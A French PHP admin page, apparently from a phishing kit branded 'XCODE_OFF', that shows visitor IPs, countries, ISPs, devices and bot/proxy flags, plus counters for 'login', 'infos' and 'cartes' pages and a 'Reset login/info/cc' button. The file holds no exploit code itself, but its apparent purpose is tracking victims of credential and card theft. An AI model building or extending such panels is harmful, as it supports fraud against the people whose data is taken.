<?php
session_start();
if (!isset($_SESSION['admin_logged_in']) || $_SESSION['admin_logged_in'] !== true) {
   header('Location: index.php');
    exit;
}


if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['reset_visitors'])) {
    $visitorsFile = __DIR__ . DIRECTORY_SEPARATOR . 'logs' . DIRECTORY_SEPARATOR . 'visitors.json';
    if (file_exists($visitorsFile)) {
        file_put_contents($visitorsFile, json_encode([]));
    }
    
    $bannedVisitsFile = __DIR__ . DIRECTORY_SEPARATOR . 'logs' . DIRECTORY_SEPARATOR . 'banned_visits.txt';
    if (file_exists($bannedVisitsFile)) {
        file_put_contents($bannedVisitsFile, "");
    }
    
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}

// Chargement des visiteurs
$visitors = [];
$visitorsFile = __DIR__ . DIRECTORY_SEPARATOR . 'logs' . DIRECTORY_SEPARATOR . 'visitors.json';
if (file_exists($visitorsFile)) {
    $jsonContent = file_get_contents($visitorsFile);
    $visitors = json_decode($jsonContent, true) ?: [];
}

$now = time();
$activeThreshold = 60;

// Statistiques
$usersOnlineCount = 0;
$mobileCount = 0;
$botsCount = 0;
$lastActivity = 0;
$countries = [];
$devices = [];
$isps = [];
$referrers = [];

foreach ($visitors as &$visitor) {
    // Calcul utilisateurs en ligne
    $visitorTimestamp = isset($visitor['timestamp']) ? strtotime($visitor['timestamp']) : 0;
    if ($visitorTimestamp && ($now - $visitorTimestamp) <= $activeThreshold) {
        $usersOnlineCount++;
    }
    if ($visitorTimestamp > $lastActivity) {
        $lastActivity = $visitorTimestamp;
    }

    // Comptage des appareils mobiles
    if (!empty($visitor['mobile']) && $visitor['mobile'] === true) {
        $mobileCount++;
    }

    // Comptage des bots
    $isProxy = isset($visitor['proxy']) && $visitor['proxy'] === true;
    $isBot = isset($visitor['bot']) && $visitor['bot'] === true;
    if ($isProxy || $isBot) {
        $botsCount++;
    }

    // Drapeau du pays
    if (!empty($visitor['countryCode'])) {
        $visitor['country_flag'] = "https://flagcdn.com/h20/" . strtolower($visitor['countryCode']) . ".png";
    } else {
        $visitor['country_flag'] = null;
    }

    // Statistiques par pays
    $country = !empty($visitor['country']) ? $visitor['country'] : 'Inconnu';
    $countries[$country] = ($countries[$country] ?? 0) + 1;

    // Statistiques par appareil
    $deviceType = !empty($visitor['device_type']) ? $visitor['device_type'] : 'Inconnu';
    $devices[$deviceType] = ($devices[$deviceType] ?? 0) + 1;

    // Statistiques par FAI
    $isp = !empty($visitor['isp']) ? $visitor['isp'] : 'Inconnu';
    $isps[$isp] = ($isps[$isp] ?? 0) + 1;

    // Statistiques par référent
    $referrer = !empty($visitor['http_referer']) ? parse_url($visitor['http_referer'], PHP_URL_HOST) : 'Direct';
    $referrers[$referrer] = ($referrers[$referrer] ?? 0) + 1;
}
unset($visitor);

$lastActivityMinutesAgo = $lastActivity ? floor(($now - $lastActivity) / 60) : '-';

// Préparation des données pour les graphiques
$topCountries = array_slice($countries, 0, 5, true);
$topDevices = array_slice($devices, 0, 5, true);
$topIsps = array_slice($isps, 0, 5, true);
$topReferrers = array_slice($referrers, 0, 5, true);

// Conversion en format JSON pour JavaScript
$chartCountriesData = json_encode([
    'labels' => array_keys($topCountries),
    'data' => array_values($topCountries)
]);

$chartDevicesData = json_encode([
    'labels' => array_keys($topDevices),
    'data' => array_values($topDevices)
]);

$chartIspsData = json_encode([
    'labels' => array_keys($topIsps),
    'data' => array_values($topIsps)
]);

$chartReferrersData = json_encode([
    'labels' => array_keys($topReferrers),
    'data' => array_values($topReferrers)
]);

// Charger le fichier JSON
$data = json_decode(file_get_contents('./func/counter_page.json'), true);

// Extraire les valeurs
$loginCount = $data['login']['count'] ?? 0;
$infosCount = $data['infos']['count'] ?? 0;
$cartesCount = $data['cartes']['count'] ?? 0;

// Simuler les visiteurs totaux (ou à remplacer par une vraie variable)
$visitors = array_unique(array_merge(
    $data['login']['by_ip'] ?? [],
    $data['infos']['by_ip'] ?? [],
    $data['cartes']['by_ip'] ?? []
));

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['reset_stats'])) {
    $resetData = [
        'login' => ['count' => 0, 'by_ip' => []],
        'infos' => ['count' => 0, 'by_ip' => []],
        'cartes' => ['count' => 0, 'by_ip' => []]
    ];
    
    file_put_contents('./func/counter_page.json', json_encode($resetData, JSON_PRETTY_PRINT));
    
    // Recharger les variables après reset
    $data = $resetData;
    $loginCount = 0;
    $infosCount = 0;
    $cartesCount = 0;
    $visitors = [];
    
   
}




?>


<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Statistiques | XCODE_OFF</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" rel="stylesheet">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
    <style>
        body { font-size: 15px; line-height: 1.6; }
        .stats-grid { grid-template-columns: repeat(auto-fit, minmax(220px, 1fr)); }
        .stat-card { transition: box-shadow 0.2s, transform 0.2s; box-shadow: 0 2px 8px 0 #0002; }
        .stat-card:hover { box-shadow: 0 8px 24px 0 #7c3aed33; transform: translateY(-2px) scale(1.02); }
        .stat-icon { font-size: 2rem; }
        .responsive-table thead { background: #23272f; }
        .responsive-table th, .responsive-table td { padding: 0.75rem 0.5rem; }
        .responsive-table td { font-size: 0.97em; }
        .responsive-table { border-radius: 0.5rem; overflow: hidden; }
        @media (max-width: 1023px) {
            .responsive-table thead { display: none; }
            .responsive-table tr { display: block; margin-bottom: 1rem; border: 1px solid #374151; border-radius: 0.5rem; background: #181b23; }
            .responsive-table td { display: flex; justify-content: space-between; align-items: center; border: none; border-bottom: 1px solid #23272f; }
            .responsive-table td:before { content: attr(data-label); font-weight: 600; color: #9CA3AF; margin-right: 1rem; flex: 0 0 110px; font-size: 0.85em; }
            .responsive-table td:last-child { border-bottom: none; }
        }
        .truncate-cell { max-width: 120px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; display: inline-block; }
        .modal { display: none; position: fixed; z-index: 50; inset: 0; background: rgba(0,0,0,0.7); }
        .modal-content { background: #181b23; margin: 20vh auto; padding: 2rem; border-radius: 0.75rem; width: 95%; max-width: 400px; box-shadow: 0 8px 32px #0005; }
        .modal-content button { min-width: 90px; }
        .pagination-nav a { min-width: 32px; text-align: center; }
        .controls-container { gap: 1rem; }
        .reset-btn { background: linear-gradient(90deg, #7c3aed 0%, #5b21b6 100%); color: #fff; border: none; transition: background 0.2s; }
        .reset-btn:hover { background: linear-gradient(90deg, #5b21b6 0%, #7c3aed 100%); }
    </style>
</head>
<body class="bg-gray-900 text-gray-200 min-h-screen">
    <!-- Header -->
        <!-- Menu PC / MOBILE-->
<?php include './assets/menu.php'?>

    <!-- Main Content -->
    <main class="container mx-auto px-4 py-6">
        <!-- Cartes stats -->
        <div class="grid gap-4 mb-8 stats-grid">
            <div class="stat-card bg-gradient-to-br from-gray-800 to-gray-900 border border-gray-700 rounded-xl p-5 flex flex-col gap-2">
                <div class="flex items-center justify-between">
                    <div>
                        <p class="text-xs text-gray-400">Visiteurs totaux</p>
                        <h3 class="text-2xl font-bold text-purple-400 flex items-center gap-2">
                            <i class="fas fa-users text-purple-400 text-xs"></i> <?= count($visitors) ?>
                        </h3>
                    </div>
                    <i class="fas fa-users stat-icon text-purple-400 bg-purple-900/20 p-3 rounded-full"></i>
                </div>
            </div>
            <div class="stat-card bg-gradient-to-br from-gray-800 to-gray-900 border border-gray-700 rounded-xl p-5 flex flex-col gap-2">
                <div class="flex items-center justify-between">
                    <div>
                        <p class="text-xs text-gray-400">Total login</p>
                        <h3 class="text-2xl font-bold text-blue-400 flex items-center gap-2">
                            <i class="fa-solid fa-right-to-bracket text-blue-400 text-xs"></i> <?= $loginCount ?>
                        </h3>
                    </div>
                    <i class="fa-solid fa-right-to-bracket stat-icon text-blue-400 bg-blue-900/20 p-3 rounded-full"></i>
                </div>
            </div>
            <div class="stat-card bg-gradient-to-br from-gray-800 to-gray-900 border border-gray-700 rounded-xl p-5 flex flex-col gap-2">
                <div class="flex items-center justify-between">
                    <div>
                        <p class="text-xs text-gray-400">Total infos</p>
                        <h3 class="text-2xl font-bold text-green-400 flex items-center gap-2">
                            <i class="fas fa-id-card text-green-400 text-xs"></i> <?= $infosCount ?>
                        </h3>
                    </div>
                    <i class="fas fa-id-card stat-icon text-green-400 bg-green-900/20 p-3 rounded-full"></i>
                </div>
            </div>
            <div class="stat-card bg-gradient-to-br from-gray-800 to-gray-900 border border-gray-700 rounded-xl p-5 flex flex-col gap-2">
                <div class="flex items-center justify-between">
                    <div>
                        <p class="text-xs text-gray-400">Total cartes</p>
                        <h3 class="text-2xl font-bold text-yellow-400 flex items-center gap-2">
                            <i class="fas fa-credit-card text-yellow-400 text-xs"></i> <?= $cartesCount ?>
                        </h3>
                    </div>
                    <i class="fas fa-credit-card stat-icon text-yellow-400 bg-yellow-900/20 p-3 rounded-full"></i>
                </div>
            </div>
        </div>
        <div class="flex justify-end mb-6 animate-fade-in">
            <form method="post" id="resetForm">
                <input type="hidden" name="reset_stats" value="1">
                <button type="button" onclick="confirmReset()" 
                        class="flex items-center gap-2 px-4 py-2 bg-gradient-to-br from-red-600 to-red-700 hover:from-red-700 hover:to-red-800 text-white rounded-lg transition-all duration-300 shadow-lg hover:shadow-red-500/40 active:scale-95 group">
                    <i class="fas fa-trash-alt group-hover:rotate-12 transition-transform"></i>
                    <span>Reset login/info/cc</span>
                </button>
            </form>
        </div>


        <!-- Graphiques -->
        <div class="grid grid-cols-1 lg:grid-cols-2 gap-6 mb-6">
            <!-- Top Pays -->
            <div class="bg-gray-800 border border-gray-700 rounded-xl p-4 shadow-lg">
                <h3 class="text-lg font-semibold text-white mb-4 flex items-center">
                    <i class="fas fa-globe mr-2 text-purple-400"></i> Top 5 des pays
                </h3>
                <div class="h-64">
                    <canvas id="countriesChart"></canvas>
                </div>
            </div>
            
            <!-- Top Appareils -->
            <div class="bg-gray-800 border border-gray-700 rounded-xl p-4 shadow-lg">
                <h3 class="text-lg font-semibold text-white mb-4 flex items-center">
                    <i class="fas fa-laptop mr-2 text-blue-400"></i> Top 5 des appareils
                </h3>
                <div class="h-64">
                    <canvas id="devicesChart"></canvas>
                </div>
            </div>
            
            <!-- Top FAI -->
            <div class="bg-gray-800 border border-gray-700 rounded-xl p-4 shadow-lg">
                <h3 class="text-lg font-semibold text-white mb-4 flex items-center">
                    <i class="fas fa-network-wired mr-2 text-yellow-400"></i> Top 5 des FAI
                </h3>
                <div class="h-64">
                    <canvas id="ispsChart"></canvas>
                </div>
            </div>
            
            <!-- Top Référents -->
            <div class="bg-gray-800 border border-gray-700 rounded-xl p-4 shadow-lg">
                <h3 class="text-lg font-semibold text-white mb-4 flex items-center">
                    <i class="fas fa-external-link-alt mr-2 text-green-400"></i> Top 5 des sources
                </h3>
                <div class="h-64">
                    <canvas id="referrersChart"></canvas>
                </div>
            </div>
        </div>

        <!-- Bouton reset -->
        <button onclick="openResetModal()" class="px-4 py-2 rounded-lg bg-purple-900/30 text-purple-300 border border-purple-800 hover:bg-purple-800/30 transition mb-6">
            <i class="fas fa-trash-alt mr-2"></i> Réinitialiser les statistiques
        </button>

        <!-- Tableau visiteurs -->
        <div class="bg-gray-800 rounded-lg overflow-x-auto mt-4">
            <table class="min-w-full divide-y divide-gray-700 responsive-table">
                <thead>
                    <tr>
                        <th class="px-3 py-2 text-left text-xs font-medium text-gray-400 uppercase">IP</th>
                        <th class="px-3 py-2 text-left text-xs font-medium text-gray-400 uppercase">Date/Heure</th>
                        <th class="px-3 py-2 text-left text-xs font-medium text-gray-400 uppercase">Pays</th>
                        <th class="px-3 py-2 text-left text-xs font-medium text-gray-400 uppercase">ISP</th>
                        <th class="px-3 py-2 text-left text-xs font-medium text-gray-400 uppercase">Device</th>
                        <th class="px-3 py-2 text-left text-xs font-medium text-gray-400 uppercase">Statut</th>
                    </tr>
                </thead>
                <tbody class="bg-gray-900 divide-y divide-gray-700">
                    <?php foreach ($visitors as $visitor): ?>
                        <tr>
                            <td class="px-3 py-2 whitespace-nowrap" data-label="IP">
                                <span class="text-xs text-white font-mono font-bold"><?= htmlspecialchars($visitor['ip'] ?? '-') ?></span>
                            </td>
                            <td class="px-3 py-2 whitespace-nowrap" data-label="Date/Heure">
                                <span class="text-xs text-gray-300 font-mono"><?= htmlspecialchars($visitor['timestamp'] ?? '-') ?></span>
                            </td>
                            <td class="px-3 py-2 whitespace-nowrap" data-label="Pays">
                                <?php if (!empty($visitor['country'])): ?>
                                    <div class="flex items-center gap-1">
                                        <?php if (!empty($visitor['countryCode'])): ?>
                                            <img src="<?= htmlspecialchars('https://flagcdn.com/h20/' . strtolower($visitor['countryCode'])) ?>.png" alt="<?= htmlspecialchars($visitor['country']) ?>" class="w-5 h-3 rounded shadow mr-1">
                                        <?php endif; ?>
                                        <span class="text-xs truncate-cell"><?= htmlspecialchars($visitor['country']) ?></span>
                                    </div>
                                <?php else: ?>
                                    <span class="text-xs text-gray-500">Inconnu</span>
                                <?php endif; ?>
                            </td>
                            <td class="px-3 py-2 whitespace-nowrap" data-label="ISP">
                                <span class="text-xs text-gray-300 truncate-cell" title="<?= htmlspecialchars($visitor['isp'] ?? '-') ?>">
                                    <?= htmlspecialchars($visitor['isp'] ?? '-') ?>
                                </span>
                            </td>
                            <td class="px-3 py-2 whitespace-nowrap" data-label="Device">
                                <span class="text-xs text-gray-300 truncate-cell" title="<?= htmlspecialchars($visitor['device_type'] ?? '') ?> <?= htmlspecialchars($visitor['device_model'] ?? '') ?>">
                                    <?= htmlspecialchars($visitor['device_type'] ?? '-') ?> - <?= htmlspecialchars($visitor['device_model'] ?? '-') ?>
                                </span>
                            </td>
                            <td class="px-3 py-2 whitespace-nowrap" data-label="Statut">
                                <?php if (!empty($visitor['bot']) || !empty($visitor['proxy'])): ?>
                                    <span class="px-2 py-1 rounded-full bg-red-800 text-red-300 text-xs font-bold">Bot/Proxy</span>
                                <?php elseif (!empty($visitor['mobile'])): ?>
                                    <span class="px-2 py-1 rounded-full bg-yellow-800 text-yellow-300 text-xs font-bold">Mobile</span>
                                <?php else: ?>
                                    <span class="px-2 py-1 rounded-full bg-green-800 text-green-300 text-xs font-bold">OK</span>
                                <?php endif; ?>
                            </td>
                        </tr>
                    <?php endforeach; ?>
                </tbody>
            </table>
        </div>
    </main>

    <!-- Modal de confirmation -->
    <div id="resetModal" class="fixed z-50 inset-0 overflow-y-auto hidden">
        <div class="flex items-center justify-center min-h-screen pt-4 px-4 pb-20 text-center sm:block sm:p-0">
            <div class="fixed inset-0 transition-opacity" aria-hidden="true">
                <div class="absolute inset-0 bg-gray-900 opacity-75"></div>
            </div>
            
            <div class="inline-block align-bottom bg-gray-800 rounded-lg text-left overflow-hidden shadow-xl transform transition-all sm:my-8 sm:align-middle sm:max-w-lg sm:w-full">
                <div class="bg-gray-800 px-4 pt-5 pb-4 sm:p-6 sm:pb-4">
                    <div class="sm:flex sm:items-start">
                        <div class="mx-auto flex-shrink-0 flex items-center justify-center h-12 w-12 rounded-full bg-red-900/30 sm:mx-0 sm:h-10 sm:w-10">
                            <i class="fas fa-exclamation-triangle text-red-400"></i>
                        </div>
                        <div class="mt-3 text-center sm:mt-0 sm:ml-4 sm:text-left">
                            <h3 class="text-lg leading-6 font-medium text-white" id="modal-title">
                                Confirmation requise
                            </h3>
                            <div class="mt-2">
                                <p class="text-sm text-gray-300">
                                    Êtes-vous sûr de vouloir réinitialiser toutes les statistiques des visiteurs ? Cette action est irréversible et supprimera toutes les données actuelles.
                                </p>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="bg-gray-800/50 px-4 py-3 sm:px-6 sm:flex sm:flex-row-reverse">
                    <form method="post" class="inline-flex">
                        <button type="submit" name="reset_visitors" class="w-full inline-flex justify-center rounded-md border border-transparent shadow-sm px-4 py-2 bg-red-600 text-base font-medium text-white hover:bg-red-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-red-500 sm:ml-3 sm:w-auto sm:text-sm">
                            Confirmer
                        </button>
                    </form>
                    <button type="button" onclick="closeResetModal()" class="mt-3 w-full inline-flex justify-center rounded-md border border-gray-700 shadow-sm px-4 py-2 bg-gray-700 text-base font-medium text-gray-300 hover:bg-gray-600 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-gray-500 sm:mt-0 sm:ml-3 sm:w-auto sm:text-sm">
                        Annuler
                    </button>
                </div>
            </div>
        </div>
    </div>

    <script>
        // Fonctions pour gérer le modal
        function openResetModal() {
            document.getElementById('resetModal').classList.remove('hidden');
        }
        
        function closeResetModal() {
            document.getElementById('resetModal').classList.add('hidden');
        }
        
        // Initialisation des graphiques
        document.addEventListener('DOMContentLoaded', function() {
            // Graphique des pays
            const countriesCtx = document.getElementById('countriesChart').getContext('2d');
            const countriesChart = new Chart(countriesCtx, {
                type: 'doughnut',
                data: {
                    labels: <?= $chartCountriesData ?>.labels,
                    datasets: [{
                        data: <?= $chartCountriesData ?>.data,
                        backgroundColor: [
                            'rgba(124, 58, 237, 0.8)',
                            'rgba(59, 130, 246, 0.8)',
                            'rgba(16, 185, 129, 0.8)',
                            'rgba(245, 158, 11, 0.8)',
                            'rgba(239, 68, 68, 0.8)'
                        ],
                        borderColor: [
                            'rgba(124, 58, 237, 1)',
                            'rgba(59, 130, 246, 1)',
                            'rgba(16, 185, 129, 1)',
                            'rgba(245, 158, 11, 1)',
                            'rgba(239, 68, 68, 1)'
                        ],
                        borderWidth: 1
                    }]
                },
                options: {
                    responsive: true,
                    maintainAspectRatio: false,
                    plugins: {
                        legend: {
                            position: 'right',
                            labels: {
                                color: '#E5E7EB'
                            }
                        }
                    }
                }
            });
            
            // Graphique des appareils
            const devicesCtx = document.getElementById('devicesChart').getContext('2d');
            const devicesChart = new Chart(devicesCtx, {
                type: 'bar',
                data: {
                    labels: <?= $chartDevicesData ?>.labels,
                    datasets: [{
                        label: 'Appareils',
                        data: <?= $chartDevicesData ?>.data,
                        backgroundColor: 'rgba(59, 130, 246, 0.7)',
                        borderColor: 'rgba(59, 130, 246, 1)',
                        borderWidth: 1
                    }]
                },
                options: {
                    responsive: true,
                    maintainAspectRatio: false,
                    scales: {
                        y: {
                            beginAtZero: true,
                            ticks: {
                                color: '#9CA3AF'
                            },
                            grid: {
                                color: 'rgba(55, 65, 81, 0.5)'
                            }
                        },
                        x: {
                            ticks: {
                                color: '#9CA3AF'
                            },
                            grid: {
                                display: false
                            }
                        }
                    },
                    plugins: {
                        legend: {
                            display: false
                        }
                    }
                }
            });
            
            // Graphique des FAI
            const ispsCtx = document.getElementById('ispsChart').getContext('2d');
            const ispsChart = new Chart(ispsCtx, {
                type: 'polarArea',
                data: {
                    labels: <?= $chartIspsData ?>.labels,
                    datasets: [{
                        data: <?= $chartIspsData ?>.data,
                        backgroundColor: [
                            'rgba(124, 58, 237, 0.7)',
                            'rgba(59, 130, 246, 0.7)',
                            'rgba(16, 185, 129, 0.7)',
                            'rgba(245, 158, 11, 0.7)',
                            'rgba(239, 68, 68, 0.7)'
                        ],
                        borderColor: [
                            'rgba(124, 58, 237, 1)',
                            'rgba(59, 130, 246, 1)',
                            'rgba(16, 185, 129, 1)',
                            'rgba(245, 158, 11, 1)',
                            'rgba(239, 68, 68, 1)'
                        ],
                        borderWidth: 1
                    }]
                },
                options: {
                    responsive: true,
                    maintainAspectRatio: false,
                    plugins: {
                        legend: {
                            position: 'right',
                            labels: {
                                color: '#E5E7EB'
                            }
                        }
                    },
                    scales: {
                        r: {
                            grid: {
                                color: 'rgba(55, 65, 81, 0.5)'
                            },
                            ticks: {
                                display: false
                            }
                        }
                    }
                }
            });
            
            // Graphique des référents
            const referrersCtx = document.getElementById('referrersChart').getContext('2d');
            const referrersChart = new Chart(referrersCtx, {
                type: 'pie',
                data: {
                    labels: <?= $chartReferrersData ?>.labels,
                    datasets: [{
                        data: <?= $chartReferrersData ?>.data,
                        backgroundColor: [
                            'rgba(124, 58, 237, 0.7)',
                            'rgba(59, 130, 246, 0.7)',
                            'rgba(16, 185, 129, 0.7)',
                            'rgba(245, 158, 11, 0.7)',
                            'rgba(239, 68, 68, 0.7)'
                        ],
                        borderColor: [
                            'rgba(124, 58, 237, 1)',
                            'rgba(59, 130, 246, 1)',
                            'rgba(16, 185, 129, 1)',
                            'rgba(245, 158, 11, 1)',
                            'rgba(239, 68, 68, 1)'
                        ],
                        borderWidth: 1
                    }]
                },
                options: {
                    responsive: true,
                    maintainAspectRatio: false,
                    plugins: {
                        legend: {
                            position: 'right',
                            labels: {
                                color: '#E5E7EB'
                            }
                        }
                    }
                }
            });
        });
        
        // Rafraîchissement automatique des données
        async function refreshStats() {
            try {
                const response = await fetch('./func/refresh_stats.php');
                if (!response.ok) throw new Error('Erreur réseau');
                const data = await response.json();
                
                // Mise à jour des compteurs
                document.getElementById('usersOnlineCount').textContent = data.usersOnlineCount;
                document.getElementById('mobileCount').textContent = data.mobileCount;
                document.getElementById('botsCount').textContent = data.botsCount;
                document.getElementById('lastActivityMinutesAgo').textContent = data.lastActivityMinutesAgo !== '-' ? 
                    data.lastActivityMinutesAgo + ' min' : '-';
                
                console.log('Statistiques rafraîchies');
            } catch (error) {
                console.error('Erreur lors du rafraîchissement:', error);
            }
        }
        
        // Rafraîchir toutes les 30 secondes
        setInterval(refreshStats, 30000);
    </script>
    <script>
function confirmReset() {
    Swal.fire({
        title: 'Confirmation',
        text: "Êtes-vous sûr de vouloir réinitialiser toutes les statistiques ?",
        icon: 'warning',
        showCancelButton: true,
        confirmButtonColor: '#d33',
        cancelButtonColor: '#3085d6',
        confirmButtonText: 'Oui, réinitialiser!',
        cancelButtonText: 'Annuler'
    }).then((result) => {
        if (result.isConfirmed) {
            document.getElementById('resetForm').submit();
            Swal.fire(
                'Réinitialisé!',
                'Les statistiques ont été remises à zéro.',
                'success'
            );
        }
    });
}
</script>
</body>
</html>